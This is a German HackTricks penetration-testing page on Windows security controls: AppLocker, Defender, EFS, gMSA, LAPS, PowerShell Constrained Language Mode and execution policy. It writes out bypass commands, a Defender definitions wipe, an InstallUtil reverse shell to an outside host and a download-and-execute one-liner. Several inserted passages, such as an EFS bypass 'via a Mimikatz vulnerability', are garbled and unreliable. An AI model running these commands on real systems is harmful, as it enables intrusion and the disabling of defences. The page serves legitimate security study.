# Windows-Sicherheitskontrollen

<details>

<summary>Lernen Sie das Hacken von AWS von Null auf Held mit <a href="https://training.hacktricks.xyz/courses/arte">htARTE (HackTricks AWS Red Team Expert)</a>!</summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

- Wenn Sie Ihr Unternehmen in HackTricks bewerben möchten oder HackTricks als PDF herunterladen möchten, überprüfen Sie die [ABONNEMENTPLÄNE](https://github.com/sponsors/carlospolop)!
- Holen Sie sich das offizielle PEASS & HackTricks-Merchandise
- Entdecken Sie die PEASS-Familie, unsere Sammlung exklusiver NFTs
- Treten Sie der Discord-Gruppe oder der Telegram-Gruppe bei oder folgen Sie uns auf Twitter
- Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die HackTricks- und HackTricks Cloud-GitHub-Repositories senden.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [Trickest](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker-Richtlinie

Eine Anwendungs-Whitelist ist eine Liste von zugelassenen Softwareanwendungen oder ausführbaren Dateien, die auf einem System vorhanden und ausgeführt werden dürfen. Das Ziel besteht darin, die Umgebung vor schädlicher Malware und nicht genehmigter Software zu schützen, die nicht den spezifischen Geschäftsanforderungen einer Organisation entspricht.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ist die Anwendungs-Whitelisting-Lösung von Microsoft und gibt Systemadministratoren die Kontrolle darüber, welche Anwendungen und Dateien Benutzer ausführen können. Es bietet eine granulare Kontrolle über ausführbare Dateien, Skripte, Windows-Installationsdateien, DLLs, verpackte Apps und verpackte App-Installationsprogramme.\
Es ist üblich, dass Organisationen cmd.exe und PowerShell.exe blockieren und den Schreibzugriff auf bestimmte Verzeichnisse einschränken, aber all dies kann umgangen werden.

### Überprüfung

Überprüfen Sie, welche Dateien/Erweiterungen auf der Blacklist/Whitelist stehen:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Dieser Registrierungspfad enthält die Konfigurationen und Richtlinien, die von AppLocker angewendet werden, und bietet eine Möglichkeit, den aktuellen Satz von Regeln zu überprüfen, die auf dem System durchgesetzt werden:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`


### Umgehung

* Nützliche **beschreibbare Ordner**, um die AppLocker-Richtlinie zu umgehen: Wenn AppLocker das Ausführen von allem innerhalb von `C:\Windows\System32` oder `C:\Windows` erlaubt, gibt es **beschreibbare Ordner**, die Sie verwenden können, um dies zu **umgehen**.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* Häufig vertraute "LOLBAS" Binärdateien können auch nützlich sein, um AppLocker zu umgehen.
* Schlecht geschriebene Regeln können ebenfalls umgangen werden.
* Zum Beispiel, `<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`, können Sie einen Ordner namens "allowed" überall erstellen und er wird erlaubt sein.
* Organisationen konzentrieren sich oft darauf, die Ausführung der Datei `%System32%\WindowsPowerShell\v1.0\powershell.exe` zu blockieren, vergessen jedoch die anderen PowerShell-Ausführungsorte wie `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` oder `PowerShell_ISE.exe`.
* Die DLL-Durchsetzung ist sehr selten aktiviert, da sie eine zusätzliche Belastung für ein System darstellen kann und eine umfangreiche Testphase erforderlich ist, um sicherzustellen, dass nichts kaputt geht. Die Verwendung von DLLs als Hintertüren hilft also dabei, AppLocker zu umgehen.
* Sie können ReflectivePick oder SharpPick verwenden, um PowerShell-Code in jedem Prozess auszuführen und AppLocker zu umgehen. Weitere Informationen finden Sie unter: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## Speicherung von Anmeldeinformationen

### Security Accounts Manager (SAM)

Lokale Anmeldeinformationen sind in dieser Datei vorhanden, die Passwörter sind gehasht.

### Local Security Authority (LSA) - LSASS

Die (gehashten) Anmeldeinformationen werden im Speicher dieses Subsystems aus Gründen der Single Sign-On gespeichert.
LSA verwaltet die lokale Sicherheitsrichtlinie (Kennwortrichtlinie, Benutzerberechtigungen...), Authentifizierung, Zugriffstoken...
LSA überprüft die bereitgestellten Anmeldeinformationen in der SAM-Datei (für eine lokale Anmeldung) und kommuniziert mit dem Domänencontroller, um einen Domänenbenutzer zu authentifizieren.

Die Anmeldeinformationen werden im Prozess LSASS gespeichert: Kerberos-Tickets, NT- und LM-Hashes, leicht entschlüsselbare Passwörter.

### LSA-Secrets

LSA kann einige Anmeldeinformationen auf der Festplatte speichern:

* Passwort des Computerkontos der Active Directory (nicht erreichbarer Domänencontroller).
* Passwörter der Konten von Windows-Diensten
* Passwörter für geplante Aufgaben
* Weitere (Passwort von IIS-Anwendungen...)

### NTDS.dit

Es ist die Datenbank der Active Directory. Sie ist nur auf Domänencontrollern vorhanden.

## Defender

[Microsoft Defender](https://en.wikipedia.org/wiki/Microsoft_Defender) ist ein Antivirus-Programm, das in Windows 10 und Windows 11 sowie in Versionen von Windows Server verfügbar ist. Es blockiert gängige Pentesting-Tools wie WinPEAS. Es gibt jedoch Möglichkeiten, diese Schutzmaßnahmen zu umgehen.

### Überprüfung

Um den Status von Defender zu überprüfen, können Sie das PS-Cmdlet `Get-MpComputerStatus` ausführen (überprüfen Sie den Wert von `RealTimeProtectionEnabled`, um zu wissen, ob es aktiv ist):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Um es aufzulisten, können Sie auch ausführen:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Verschlüsseltes Dateisystem (EFS)

EFS sichert Dateien durch Verschlüsselung mit einem **symmetrischen Schlüssel**, der als **File Encryption Key (FEK)** bezeichnet wird. Dieser Schlüssel wird mit dem **öffentlichen Schlüssel** des Benutzers verschlüsselt und im **alternativen Datenstrom** $EFS der verschlüsselten Datei gespeichert. Wenn eine Entschlüsselung erforderlich ist, wird der entsprechende **private Schlüssel** des digitalen Zertifikats des Benutzers verwendet, um den FEK aus dem $EFS-Stream zu entschlüsseln. Weitere Details finden Sie [hier](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Entschlüsselungsszenarien ohne Benutzerinitiierung** umfassen:

- Wenn Dateien oder Ordner auf ein nicht-EFS-Dateisystem wie [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) verschoben werden, werden sie automatisch entschlüsselt.
- Verschlüsselte Dateien, die über das SMB/CIFS-Protokoll über das Netzwerk gesendet werden, werden vor der Übertragung entschlüsselt.

Diese Verschlüsselungsmethode ermöglicht dem Besitzer einen **transparenten Zugriff** auf verschlüsselte Dateien. Das einfache Ändern des Passworts des Besitzers und das Anmelden ermöglichen jedoch keine Entschlüsselung.

**Hauptpunkte**:
- EFS verwendet einen symmetrischen FEK, der mit dem öffentlichen Schlüssel des Benutzers verschlüsselt ist.
- Die Entschlüsselung erfolgt mit dem privaten Schlüssel des Benutzers, um auf den FEK zuzugreifen.
- Die automatische Entschlüsselung erfolgt unter bestimmten Bedingungen, z. B. beim Kopieren auf FAT32 oder bei der Netzwerkübertragung.
- Verschlüsselte Dateien sind für den Besitzer ohne zusätzliche Schritte zugänglich.

### EFS-Informationen überprüfen

Überprüfen Sie, ob ein **Benutzer** diesen **Dienst** verwendet hat, indem Sie überprüfen, ob dieser Pfad existiert: `C:\users\<Benutzername>\appdata\roaming\Microsoft\Protect`

Überprüfen Sie, **wer** auf die Datei zugreifen kann, indem Sie `cipher /c \<Datei>` verwenden.
Sie können auch `cipher /e` und `cipher /d` innerhalb eines Ordners verwenden, um alle Dateien zu **verschlüsseln** und **entschlüsseln**.

### Entschlüsselung von EFS-Dateien

#### Als Authority System fungieren

Hierfür muss der **Opferbenutzer** einen **Prozess** auf dem Host **ausführen**. In diesem Fall können Sie mit einer `meterpreter`-Sitzung das Token des Benutzerprozesses übernehmen (`impersonate_token` von `incognito`). Oder Sie könnten einfach zu einem Prozess des Benutzers `migrate`.

#### Kenntnis des Benutzerpassworts

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## Group Managed Service Accounts (gMSA)

Microsoft hat **Group Managed Service Accounts (gMSA)** entwickelt, um die Verwaltung von Dienstkonten in IT-Infrastrukturen zu vereinfachen. Im Gegensatz zu herkömmlichen Dienstkonten, bei denen häufig die Einstellung "**Passwort läuft nie ab**" aktiviert ist, bieten gMSAs eine sicherere und verwaltbare Lösung:

- **Automatisches Passwortmanagement**: gMSAs verwenden ein komplexes, 240 Zeichen langes Passwort, das automatisch gemäß der Domänen- oder Computer-Richtlinie geändert wird. Dieser Vorgang wird vom Key Distribution Service (KDC) von Microsoft verwaltet und eliminiert die Notwendigkeit manueller Passwortaktualisierungen.
- **Verbesserte Sicherheit**: Diese Konten sind vor Sperrungen geschützt und können nicht für interaktive Anmeldungen verwendet werden, was ihre Sicherheit erhöht.
- **Unterstützung mehrerer Hosts**: gMSAs können auf mehreren Hosts gemeinsam genutzt werden, was sie ideal für Dienste macht, die auf mehreren Servern ausgeführt werden.
- **Unterstützung für geplante Aufgaben**: Im Gegensatz zu verwalteten Dienstkonten unterstützen gMSAs das Ausführen geplanter Aufgaben.
- **Vereinfachtes SPN-Management**: Das System aktualisiert automatisch den Service Principal Name (SPN), wenn es Änderungen an den sAMaccount-Details oder dem DNS-Namen des Computers gibt, was das SPN-Management vereinfacht.

Die Passwörter für gMSAs werden in der LDAP-Eigenschaft _**msDS-ManagedPassword**_ gespeichert und alle 30 Tage automatisch von den Domänencontrollern (DCs) zurückgesetzt. Dieses Passwort, ein verschlüsselter Datenblob namens [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), kann nur von autorisierten Administratoren und den Servern, auf denen die gMSAs installiert sind, abgerufen werden, um eine sichere Umgebung zu gewährleisten. Um auf diese Informationen zuzugreifen, ist eine gesicherte Verbindung wie LDAPS erforderlich oder die Verbindung muss mit 'Sealing & Secure' authentifiziert werden.

![https://cube0x0.github.io/Relaying-for-gMSA/](../.gitbook/assets/asd1.png)

Sie können dieses Passwort mit [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader) auslesen:
```
/GMSAPasswordReader --AccountName jkohler
```
**[Hier finden Sie weitere Informationen in diesem Beitrag](https://cube0x0.github.io/Relaying-for-gMSA/)**

Schauen Sie sich auch diese [Webseite](https://cube0x0.github.io/Relaying-for-gMSA/) an, um herauszufinden, wie man einen **NTLM-Relay-Angriff** durchführt, um das **Passwort** von **gMSA** zu **lesen**.

## LAPS

Die **Local Administrator Password Solution (LAPS)**, die von [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) zum Download zur Verfügung steht, ermöglicht die Verwaltung von lokalen Administratorpasswörtern. Diese Passwörter, die **zufällig**, eindeutig und **regelmäßig geändert** werden, werden zentral im Active Directory gespeichert. Der Zugriff auf diese Passwörter ist durch ACLs auf autorisierte Benutzer beschränkt. Bei ausreichenden Berechtigungen besteht die Möglichkeit, lokale Administratorpasswörter zu lesen.

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

Der PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **sperrt viele der Funktionen**, die zum effektiven Einsatz von PowerShell benötigt werden, wie z.B. das Blockieren von COM-Objekten, die nur die Verwendung von genehmigten .NET-Typen, XAML-basierten Workflows, PowerShell-Klassen und mehr erlauben.

### **Überprüfung**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Umgehung

#### UAC Bypass

##### UAC Bypass mit Fodhelper.exe

Diese Technik ermöglicht es, die Benutzerkontensteuerung (UAC) zu umgehen, indem die Fodhelper.exe-Datei manipuliert wird. Fodhelper.exe ist ein Dienstprogramm, das von Windows verwendet wird, um erhöhte Berechtigungen für bestimmte Aufgaben zu erhalten. Durch die Ausnutzung einer Schwachstelle in Fodhelper.exe kann ein Angreifer administrative Rechte erlangen, ohne dass der Benutzer dazu aufgefordert wird, die Berechtigung zu bestätigen.

##### UAC Bypass mit Eventvwr.exe

Diese Methode nutzt die Eventvwr.exe-Datei, um die UAC zu umgehen. Eventvwr.exe ist ein Dienstprogramm, das von Windows verwendet wird, um Ereignisprotokolle anzuzeigen. Durch die Ausnutzung einer Schwachstelle in Eventvwr.exe kann ein Angreifer administrative Rechte erlangen, ohne dass der Benutzer dazu aufgefordert wird, die Berechtigung zu bestätigen.

##### UAC Bypass mit CMSTPLUA COM-Objekt

Diese Technik nutzt das CMSTPLUA COM-Objekt, um die UAC zu umgehen. Das CMSTPLUA COM-Objekt wird von Windows verwendet, um die Ausführung von Skripten mit erhöhten Berechtigungen zu ermöglichen. Durch die Ausnutzung einer Schwachstelle im CMSTPLUA COM-Objekt kann ein Angreifer administrative Rechte erlangen, ohne dass der Benutzer dazu aufgefordert wird, die Berechtigung zu bestätigen.

#### EFS-Bypass

##### EFS-Bypass mit Mimikatz

Mimikatz ist ein leistungsstarkes Tool, das von Angreifern verwendet wird, um Anmeldeinformationen aus dem Speicher von Windows zu extrahieren. Es kann auch verwendet werden, um den EFS-Bypass durchzuführen. EFS (Encrypting File System) ist eine Funktion von Windows, die Dateien und Ordner verschlüsselt. Durch die Ausnutzung einer Schwachstelle in Mimikatz kann ein Angreifer auf verschlüsselte Dateien zugreifen, ohne den erforderlichen Entschlüsselungsschlüssel zu besitzen.

##### EFS-Bypass mit Lauschangriff

Diese Methode nutzt einen Lauschangriff, um den EFS-Bypass durchzuführen. Ein Lauschangriff ist eine Technik, bei der der Netzwerkverkehr abgehört und analysiert wird, um sensible Informationen zu erfassen. Durch das Abhören des Netzwerkverkehrs kann ein Angreifer den Entschlüsselungsschlüssel für verschlüsselte Dateien abfangen und somit den EFS-Bypass durchführen.
```powershell
#Easy bypass
Powershell -version 2
```
In der aktuellen Windows-Version funktioniert dieser Bypass nicht, aber Sie können [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) verwenden.\
**Um es zu kompilieren, müssen Sie möglicherweise** **eine Referenz hinzufügen** -> _Durchsuchen_ -> _Durchsuchen_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` hinzufügen und **das Projekt auf .Net4.5 ändern**.

#### Direkter Bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse Shell:

Ein Reverse Shell ist eine Technik, bei der ein Angreifer eine Verbindung zu einem verwundbaren System herstellt und eine Shell-Sitzung auf diesem System öffnet. Im Gegensatz zu einer normalen Shell-Sitzung, bei der der Benutzer eine Verbindung zu einem entfernten System herstellt, ermöglicht ein Reverse Shell dem Angreifer, eine Verbindung von einem entfernten System zu einem verwundbaren System herzustellen. Dies kann nützlich sein, um Sicherheitsmaßnahmen wie Firewalls oder NAT-Geräte zu umgehen.
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Sie können [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) oder [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) verwenden, um **PowerShell-Code** in jedem Prozess auszuführen und den eingeschränkten Modus zu umgehen. Weitere Informationen finden Sie unter: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS-Ausführungsrichtlinie

Standardmäßig ist sie auf **restricted** eingestellt. Hauptwege, um diese Richtlinie zu umgehen:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Mehr Informationen finden Sie [hier](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

Die SSPI ist die API, die zur Authentifizierung von Benutzern verwendet werden kann.

Die SSPI ist dafür verantwortlich, das geeignete Protokoll für zwei Maschinen zu finden, die miteinander kommunizieren möchten. Die bevorzugte Methode hierfür ist Kerberos. Anschließend verhandelt die SSPI, welches Authentifizierungsprotokoll verwendet wird. Diese Authentifizierungsprotokolle werden Security Support Provider (SSP) genannt und befinden sich in Form einer DLL in jeder Windows-Maschine. Beide Maschinen müssen das gleiche SSP unterstützen, um kommunizieren zu können.

### Haupt-SSPs

* **Kerberos**: Der bevorzugte SSP
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** und **NTLMv2**: Aus Kompatibilitätsgründen
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: Webserver und LDAP, Passwort in Form eines MD5-Hashes
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL und TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: Wird verwendet, um das zu verwendende Protokoll zu verhandeln (Kerberos oder NTLM, wobei Kerberos das Standardprotokoll ist)
* %windir%\Windows\System32\lsasrv.dll

#### Die Verhandlung kann mehrere Methoden oder nur eine anbieten.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ist eine Funktion, die eine **Zustimmungsaufforderung für erhöhte Aktivitäten** ermöglicht.

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterstützt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

***

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder folgen Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
